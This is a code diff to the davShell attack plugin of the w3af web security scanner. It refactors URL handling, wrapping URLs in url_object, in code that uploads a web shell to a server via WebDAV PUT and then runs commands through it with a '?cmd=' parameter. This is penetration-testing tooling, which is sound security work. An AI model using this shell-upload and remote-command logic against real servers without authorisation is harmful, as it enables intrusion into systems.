@@ -31,6 +31,7 @@ from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
 import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
 from core.data.kb.exec_shell import exec_shell as exec_shell
+from core.data.parsers.urlParser import url_object
 
 from core.controllers.w3afException import w3afException
 
@@ -119,6 +120,7 @@ class davShell(baseAttackPlugin):
             
             # Upload the shell
             url_to_upload = vuln_obj.getURL().urlJoin( filename + '.' + extension )
+            
             om.out.debug('Uploading file: ' + url_to_upload )
             self._urlOpener.PUT( url_to_upload, data=file_content )
             
@@ -126,15 +128,17 @@ class davShell(baseAttackPlugin):
             # All w3af shells, when invoked with a blank command, return a 
             # specific value in the response:
             # shell_handler.SHELL_IDENTIFIER
-            response = self._urlOpener.GET( url_to_upload + '?cmd=' )
+            exploit_url = url_object( url_to_upload + '?cmd=' )
+            response = self._urlOpener.GET( exploit_url )
+            
             if shell_handler.SHELL_IDENTIFIER in response.getBody():
                 msg = 'The uploaded shell returned the SHELL_IDENTIFIER: "'
                 msg += shell_handler.SHELL_IDENTIFIER + '".'
                 om.out.debug( msg )
-                self._exploit_url = url_to_upload + '?cmd='
+                self._exploit_url = exploit_url
                 return True
             else:
-                msg = 'The uploaded shell with extension: "'+extension
+                msg = 'The uploaded shell with extension: "' + extension
                 msg += '" DIDN\'T returned what we expected, it returned: ' + response.getBody()
                 om.out.debug( msg )
                 extension = ''
@@ -210,6 +214,7 @@ class davShellObj(exec_shell):
         @return: The result of the command.
         '''
         to_send = self.getExploitURL() + urllib.quote_plus( command )
+        to_send = url_object( to_send )
         response = self._urlOpener.GET( to_send )
         return response.getBody()
     
